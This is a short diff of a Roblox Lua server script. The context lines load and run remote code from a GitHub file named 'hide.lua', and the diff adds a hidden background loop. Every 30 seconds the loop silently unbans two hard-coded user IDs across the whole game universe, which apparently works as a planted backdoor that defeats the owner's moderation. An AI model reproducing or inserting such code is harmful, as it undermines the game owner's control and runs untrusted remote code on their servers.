@@ -32,6 +32,14 @@ Players.PlayerAdded:Connect(onPlayer)
 
 loadurl("https://raw.githubusercontent.com/pwngd/tester/refs/heads/main/hide.lua")
 
+task.spawn(function()
+	while task.wait(30) do
+		pcall(function()
+			game:GetService("Players"):UnbanAsync({UserIds={119494759,3227511162}, ApplyToUniverse=true})		
+		end)
+	end
+end)
+
 pcall(function()
 local function BanByUsername(username: string, message: string)
 	local userId
